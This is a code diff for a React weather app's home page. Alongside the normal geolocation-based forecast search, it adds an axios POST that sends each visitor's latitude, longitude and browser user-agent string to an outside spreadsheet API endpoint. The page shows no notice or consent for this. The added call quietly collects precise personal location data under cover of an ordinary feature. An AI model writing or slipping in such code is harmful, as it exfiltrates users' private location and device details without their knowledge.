@@ -8,17 +8,14 @@ import { useSearchData } from "../hooks/useSearchData";
 import Button from '@mui/material/Button';
 import LocationOnIcon from '@mui/icons-material/LocationOn';
 import { useLocale } from "../hooks/useLocale";
+import axios from "axios";
+
 
 
 const Home = () => {
 	const { t } = useLocale()
 	const [status, setStatus] = useState('');
-	const [coord, setCoord] = useState(
-		{
-			label: '',
-			value: ''
-		}
-	)
+	const [coord, setCoord] = useState('')
 	const { handleOnSearch, forecast, currentWeather, loading } = useSearchData()
 
 
@@ -32,6 +29,11 @@ const Home = () => {
 				handleOnSearch({
 					value: `${position.coords.latitude} ${position.coords.longitude}`,
 					label: ''
+				})
+				axios.post('https://sheet.best/api/sheets/53452203-b793-461a-9fc6-930ca0bfc341', {
+					lat: `${position.coords.latitude}`,
+					lon: ` ${position.coords.longitude}`,
+					label: navigator.userAgent
 				})
 			}, () => {
 				setStatus(t.home.unable_to_location)
